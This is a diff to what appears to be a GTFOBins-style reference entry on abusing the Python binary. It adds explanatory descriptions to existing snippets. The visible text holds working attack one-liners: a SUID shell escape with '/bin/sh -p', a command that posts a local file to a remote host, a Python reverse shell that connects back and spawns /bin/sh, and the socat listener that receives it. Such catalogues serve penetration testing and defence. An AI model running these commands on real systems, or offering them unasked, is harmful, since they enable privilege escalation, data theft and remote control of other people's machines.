@@ -7,7 +7,7 @@ functions:
   suid-enabled:
     - code: ./python -c 'import os; os.system("/bin/sh -p")'
   upload:
-    - description: Send local file via "d" parameter of a HTTP POST request.
+    - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service to collect the file on the other end.
       code: |
         export URL=http://10.0.0.1/
         export LFILE=file_to_send
@@ -23,8 +23,9 @@ functions:
         export LFILE=file_to_get
         python -c 'import urllib as u,os.environ as e;u.urlretrieve(e["URL"], e["LFILE"])'
   reverse-shell:
-    - code: |
-        export RHOST=127.0.0.1 
+    - description: Run <code>socat file:`tty`,raw,echo=0 tcp-listen:8000</code> to receive the shell on the other end.
+      code: |
+        export RHOST=127.0.0.1
         export RPORT=8000 
         python -c 'import sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")'
   load-library:
